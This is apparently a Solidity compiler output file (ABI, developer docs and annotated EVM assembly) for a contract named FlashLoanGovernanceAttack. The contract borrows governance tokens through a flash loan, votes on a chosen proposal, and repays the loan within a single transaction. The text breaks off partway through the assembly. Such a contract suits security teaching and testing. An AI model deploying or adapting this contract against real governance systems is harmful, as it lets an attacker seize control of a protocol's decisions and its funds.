{
	"I/FlashLoanGovernanceAttack.sol": {
		"FlashLoanGovernanceAttack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_provider",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_gov",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "_proposalId",
							"type": "uint256"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attacker",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						},
						{
							"internalType": "uint256",
							"name": "fee",
							"type": "uint256"
						}
					],
					"name": "executeOnFlashLoan",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "govToken",
					"outputs": [
						{
							"internalType": "contract IERC20",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "governance",
					"outputs": [
						{
							"internalType": "contract IGovernance",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "proposalId",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "provider",
					"outputs": [
						{
							"internalType": "contract IFlashLoanProvider",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"details": "Executes a flash loan to gain temporary voting power in a governance system.",
				"kind": "dev",
				"methods": {},
				"title": "FlashLoanGovernanceAttack",
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"I/FlashLoanGovernanceAttack.sol\":660:1702  contract FlashLoanGovernanceAttack {... */\n  mstore(0x40, 0x80)\n    /* \"I/FlashLoanGovernanceAttack.sol\":865:1148  constructor(address _provider, address _gov, uint256 _proposalId) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"I/FlashLoanGovernanceAttack.sol\":971:980  _provider */\n  dup3\n    /* \"I/FlashLoanGovernanceAttack.sol\":941:949  provider */\n  0x01\n  0x00\n    /* \"I/FlashLoanGovernanceAttack.sol\":941:981  provider = IFlashLoanProvider(_provider) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"I/FlashLoanGovernanceAttack.sol\":1016:1020  _gov */\n  dup2\n    /* \"I/FlashLoanGovernanceAttack.sol\":991:1001  governance */\n  0x00\n  0x00\n    /* \"I/FlashLoanGovernanceAttack.sol\":991:1021  governance = IGovernance(_gov) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"I/FlashLoanGovernanceAttack.sol\":1049:1059  governance */\n  0x00\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"I/FlashLoanGovernanceAttack.sol\":1049:1073  governance.proposalToken */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xa530cbf1\n    /* \"I/FlashLoanGovernanceAttack.sol\":1049:1075  governance.proposalToken() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_7\n  jumpi\n  returndatacopy(0x00, 0x00, returndatasize)\n  revert(0x00, returndatasize)\ntag_7:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_8\n  swap2\n  swap1\n  tag_9\n  jump\t// in\ntag_8:\n    /* \"I/FlashLoanGovernanceAttack.sol\":1031:1039  govToken */\n  0x02\n  0x00\n    /* \"I/FlashLoanGovernanceAttack.sol\":1031:1076  govToken = IERC20(governance.proposalToken()) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"I/FlashLoanGovernanceAttack.sol\":1099:1110  _proposalId */\n  dup1\n    /* \"I/FlashLoanGovernanceAttack.sol\":1086:1096  proposalId */\n  0x03\n    /* \"I/FlashLoanGovernanceAttack.sol\":1086:1110  proposalId = _proposalId */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"I/FlashLoanGovernanceAttack.sol\":1131:1141  msg.sender */\n  caller\n    /* \"I/FlashLoanGovernanceAttack.sol\":1120:1128  attacker */\n  0x04\n  0x00\n    /* \"I/FlashLoanGovernanceAttack.sol\":1120:1141  attacker = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"I/FlashLoanGovernanceAttack.sol\":865:1148  constructor(address _provider, address _gov, uint256 _proposalId) {... */\n  pop\n  pop\n  pop\n    /* \"I/FlashLoanGovernanceAttack.sol\":660:1702  contract FlashLoanGovernanceAttack {... */\n  jump(tag_10)\n    /* \"#utility.yul\":88:205   */\ntag_12:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_14:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_15:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_27\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_14\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_16:\n    /* \"#utility.yul\":641:665   */\n  tag_29\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_15\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_30\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_30:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_17:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_32\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_16\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:922   */\ntag_18:\n    /* \"#utility.yul\":882:889   */\n  0x00\n    /* \"#utility.yul\":911:916   */\n  dup2\n    /* \"#utility.yul\":900:916   */\n  swap1\n  pop\n    /* \"#utility.yul\":845:922   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":928:1050   */\ntag_19:\n    /* \"#utility.yul\":1001:1025   */\n  tag_35\n    /* \"#utility.yul\":1019:1024   */\n  dup2\n    /* \"#utility.yul\":1001:1025   */\n  tag_18\n  jump\t// in\ntag_35:\n    /* \"#utility.yul\":994:999   */\n  dup2\n    /* \"#utility.yul\":991:1026   */\n  eq\n    /* \"#utility.yul\":981:1044   */\n  tag_36\n  jumpi\n    /* \"#utility.yul\":1040:1041   */\n  0x00\n    /* \"#utility.yul\":1037:1038   */\n  0x00\n    /* \"#utility.yul\":1030:1042   */\n  revert\n    /* \"#utility.yul\":981:1044   */\ntag_36:\n    /* \"#utility.yul\":928:1050   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1056:1199   */\ntag_20:\n    /* \"#utility.yul\":1113:1118   */\n  0x00\n    /* \"#utility.yul\":1144:1150   */\n  dup2\n    /* \"#utility.yul\":1138:1151   */\n  mload\n    /* \"#utility.yul\":1129:1151   */\n  swap1\n  pop\n    /* \"#utility.yul\":1160:1193   */\n  tag_38\n    /* \"#utility.yul\":1187:1192   */\n  dup2\n    /* \"#utility.yul\":1160:1193   */\n  tag_19\n  jump\t// in\ntag_38:\n    /* \"#utility.yul\":1056:1199   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1205:1868   */\ntag_3:\n    /* \"#utility.yul\":1293:1299   */\n  0x00\n    /* \"#utility.yul\":1301:1307   */\n  0x00\n    /* \"#utility.yul\":1309:1315   */\n  0x00\n    /* \"#utility.yul\":1358:1360   */\n  0x60\n    /* \"#utility.yul\":1346:1355   */\n  dup5\n    /* \"#utility.yul\":1337:1344   */\n  dup7\n    /* \"#utility.yul\":1333:1356   */\n  sub\n    /* \"#utility.yul\":1329:1361   */\n  slt\n    /* \"#utility.yul\":1326:1445   */\n  iszero\n  tag_40\n  jumpi\n    /* \"#utility.yul\":1364:1443   */\n  tag_41\n  tag_12\n  jump\t// in\ntag_41:\n    /* \"#utility.yul\":1326:1445   */\ntag_40:\n    /* \"#utility.yul\":1484:1485   */\n  0x00\n    /* \"#utility.yul\":1509:1573   */\n  tag_42\n    /* \"#utility.yul\":1565:1572   */\n  dup7\n    /* \"#utility.yul\":1556:1562   */\n  dup3\n    /* \"#utility.yul\":1545:1554   */\n  dup8\n    /* \"#utility.yul\":1541:1563   */\n  add\n    /* \"#utility.yul\":1509:1573   */\n  tag_17\n  jump\t// in\ntag_42:\n    /* \"#utility.yul\":1499:1573   */\n  swap4\n  pop\n    /* \"#utility.yul\":1455:1583   */\n  pop\n    /* \"#utility.yul\":1622:1624   */\n  0x20\n    /* \"#utility.yul\":1648:1712   */\n  tag_43\n    /* \"#utility.yul\":1704:1711   */\n  dup7\n    /* \"#utility.yul\":1695:1701   */\n  dup3\n    /* \"#utility.yul\":1684:1693   */\n  dup8\n    /* \"#utility.yul\":1680:1702   */\n  add\n    /* \"#utility.yul\":1648:1712   */\n  tag_17\n  jump\t// in\ntag_43:\n    /* \"#utility.yul\":1638:1712   */\n  swap3\n  pop\n    /* \"#utility.yul\":1593:1722   */\n  pop\n    /* \"#utility.yul\":1761:1763   */\n  0x40\n    /* \"#utility.yul\":1787:1851   */\n  tag_44\n    /* \"#utility.yul\":1843:1850   */\n  dup7\n    /* \"#utility.yul\":1834:1840   */\n  dup3\n    /* \"#utility.yul\":1823:1832   */\n  dup8\n    /* \"#utility.yul\":1819:1841   */\n  add\n    /* \"#utility.yul\":1787:1851   */\n  tag_20\n  jump\t// in\ntag_44:\n    /* \"#utility.yul\":1777:1851   */\n  swap2\n  pop\n    /* \"#utility.yul\":1732:1861   */\n  pop\n    /* \"#utility.yul\":1205:1868   */\n  swap3\n  pop\n  swap3\n  pop\n  swap3\n  jump\t// out\n    /* \"#utility.yul\":1874:2225   */\ntag_9:\n    /* \"#utility.yul\":1944:1950   */\n  0x00\n    /* \"#utility.yul\":1993:1995   */\n  0x20\n    /* \"#utility.yul\":1981:1990   */\n  dup3\n    /* \"#utility.yul\":1972:1979   */\n  dup5\n    /* \"#utility.yul\":1968:1991   */\n  sub\n    /* \"#utility.yul\":1964:1996   */\n  slt\n    /* \"#utility.yul\":1961:2080   */\n  iszero\n  tag_46\n  jumpi\n    /* \"#utility.yul\":1999:2078   */\n  tag_47\n  tag_12\n  jump\t// in\ntag_47:\n    /* \"#utility.yul\":1961:2080   */\ntag_46:\n    /* \"#utility.yul\":2119:2120   */\n  0x00\n    /* \"#utility.yul\":2144:2208   */\n  tag_48\n    /* \"#utility.yul\":2200:2207   */\n  dup5\n    /* \"#utility.yul\":2191:2197   */\n  dup3\n    /* \"#utility.yul\":2180:2189   */\n  dup6\n    /* \"#utility.yul\":2176:2198   */\n  add\n    /* \"#utility.yul\":2144:2208   */\n  tag_17\n  jump\t// in\ntag_48:\n    /* \"#utility.yul\":2134:2208   */\n  swap2\n  pop\n    /* \"#utility.yul\":2090:2218   */\n  pop\n    /* \"#utility.yul\":1874:2225   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"I/FlashLoanGovernanceAttack.sol\":660:1702  contract FlashLoanGovernanceAttack {... */\ntag_10:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"I/FlashLoanGovernanceAttack.sol\":660:1702  contract FlashLoanGovernanceAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x48eb76ee\n      gt\n      tag_10\n      jumpi\n      dup1\n      0x48eb76ee\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x5aa6e675\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x64dd891a\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x84f0e272\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_10:\n      dup1\n      0x05268cff\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x085d4883\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x2dfca445\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"I/FlashLoanGovernanceAttack.sol\":776:798  IERC20 public govToken */\n    tag_3:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"I/FlashLoanGovernanceAttack.sol\":736:770  IFlashLoanProvider public provider */\n    tag_4:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"I/FlashLoanGovernanceAttack.sol\":804:829  uint256 public proposalId */\n    tag_5:\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"I/FlashLoanGovernanceAttack.sol\":835:858  address public attacker */\n    tag_6:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      tag_25\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"I/FlashLoanGovernanceAttack.sol\":701:730  IGovernance public governance */\n    tag_7:\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      tag_29\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"I/FlashLoanGovernanceAttack.sol\":1154:1316  function attack(uint256 amount) external {... */\n    tag_8:\n      tag_31\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_32\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n      tag_34\n      jump\t// in\n    tag_31:\n      stop\n        /* \"I/FlashLoanGovernanceAttack.sol\":1322:1700  function executeOnFlashLoan(uint256 amount, uint256 fee) external {... */\n    tag_9:\n      tag_35\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_36\n      swap2\n      swap1\n      tag_37\n      jump\t// in\n    tag_36:\n      tag_38\n      jump\t// in\n    tag_35:\n      stop\n        /* \"I/FlashLoanGovernanceAttack.sol\":776:798  IERC20 public govToken */\n    tag_12:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"I/FlashLoanGovernanceAttack.sol\":736:770  IFlashLoanProvider public provider */\n    tag_16:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"I/FlashLoanGovernanceAttack.sol\":804:829  uint256 public proposalId */\n    tag_20:\n      sload(0x03)\n      dup2\n      jump\t// out\n        /* \"I/FlashLoanGovernanceAttack.sol\":835:858  address public attacker */\n    tag_24:\n      0x04\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"I/FlashLoanGovernanceAttack.sol\":701:730  IGovernance public governance */\n    tag_28:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"I/FlashLoanGovernanceAttack.sol\":1154:1316  function attack(uint256 amount) external {... */\n    tag_34:\n        /* \"I/FlashLoanGovernanceAttack.sol\":1227:1235  attacker */\n      0x04\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1213:1235  msg.sender == attacker */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1213:1223  msg.sender */\n      caller\n        /* \"I/FlashLoanGovernanceAttack.sol\":1213:1235  msg.sender == attacker */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"I/FlashLoanGovernanceAttack.sol\":1205:1266  require(msg.sender == attacker, \"Only attacker can initiate\") */\n      tag_40\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_41\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_40:\n        /* \"I/FlashLoanGovernanceAttack.sol\":1276:1284  provider */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1276:1301  provider.executeFlashLoan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfb056f68\n        /* \"I/FlashLoanGovernanceAttack.sol\":1302:1308  amount */\n      dup3\n        /* \"I/FlashLoanGovernanceAttack.sol\":1276:1309  provider.executeFlashLoan(amount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_43\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_43:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      revert(0x00, 0x00)\n    tag_44:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_46\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_46:\n      pop\n      pop\n      pop\n      pop\n        /* \"I/FlashLoanGovernanceAttack.sol\":1154:1316  function attack(uint256 amount) external {... */\n      pop\n      jump\t// out\n        /* \"I/FlashLoanGovernanceAttack.sol\":1322:1700  function executeOnFlashLoan(uint256 amount, uint256 fee) external {... */\n    tag_38:\n        /* \"I/FlashLoanGovernanceAttack.sol\":1428:1436  provider */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1406:1437  msg.sender == address(provider) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1406:1416  msg.sender */\n      caller\n        /* \"I/FlashLoanGovernanceAttack.sol\":1406:1437  msg.sender == address(provider) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"I/FlashLoanGovernanceAttack.sol\":1398:1455  require(msg.sender == address(provider), \"Only provider\") */\n      tag_48\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_49\n      swap1\n      tag_50\n      jump\t// in\n    tag_49:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_48:\n        /* \"I/FlashLoanGovernanceAttack.sol\":1509:1517  govToken */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1509:1525  govToken.approve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x095ea7b3\n        /* \"I/FlashLoanGovernanceAttack.sol\":1534:1544  governance */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1547:1553  amount */\n      dup5\n        /* \"I/FlashLoanGovernanceAttack.sol\":1509:1554  govToken.approve(address(governance), amount) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_51\n      swap3\n      swap2\n      swap1\n      tag_52\n      jump\t// in\n    tag_51:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_54\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_54:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_55\n      swap2\n      swap1\n      tag_56\n      jump\t// in\n    tag_55:\n      pop\n        /* \"I/FlashLoanGovernanceAttack.sol\":1564:1574  governance */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1564:1579  governance.vote */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc9d27afe\n        /* \"I/FlashLoanGovernanceAttack.sol\":1580:1590  proposalId */\n      sload(0x03)\n        /* \"I/FlashLoanGovernanceAttack.sol\":1592:1596  true */\n      0x01\n        /* \"I/FlashLoanGovernanceAttack.sol\":1564:1597  governance.vote(proposalId, true) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_57\n      swap3\n      swap2\n      swap1\n      tag_58\n      jump\t// in\n    tag_57:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      revert(0x00, 0x00)\n    tag_59:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_61\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_61:\n      pop\n      pop\n      pop\n      pop\n        /* \"I/FlashLoanGovernanceAttack.sol\":1643:1651  govToken */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1643:1660  govToken.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa9059cbb\n        /* \"I/FlashLoanGovernanceAttack.sol\":1669:1677  provider */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"I/FlashLoanGovernanceAttack.sol\":1689:1692  fee */\n      dup4\n        /* \"I/FlashLoanGovernanceAttack.sol\":1680:1686  amount */\n      dup6\n        /* \"I/FlashLoanGovernanceAttack.sol\":1680:1692  amount + fee */\n      tag_62\n      swap2\n      swap1\n      tag_63\n      jump\t// in\n    tag_62:\n        /* \"I/FlashLoanGovernanceAttack.sol\":1643:1693  govToken.transfer(address(provider), amount + fee) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_64\n      swap3\n      swap2\n      swap1\n      tag_52\n      jump\t// in\n    tag_64:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_66\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_66:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_67\n      swap2\n      swap1\n      tag_56\n      jump\t// in\n    tag_67:\n      pop\n        /* \"I/FlashLoanGovernanceAttack.sol\":1322:1700  function executeOnFlashLoan(uint256 amount, uint256 fee) external {... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_68:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_69:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_70:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_101\n        /* \"#utility.yul\":306:340   */\n      tag_102\n        /* \"#utility.yul\":315:339   */\n      tag_103\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_68\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":306:340   */\n      tag_69\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":288:341   */\n      tag_68\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_71:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_105\n        /* \"#utility.yul\":467:472   */\n      dup3\n    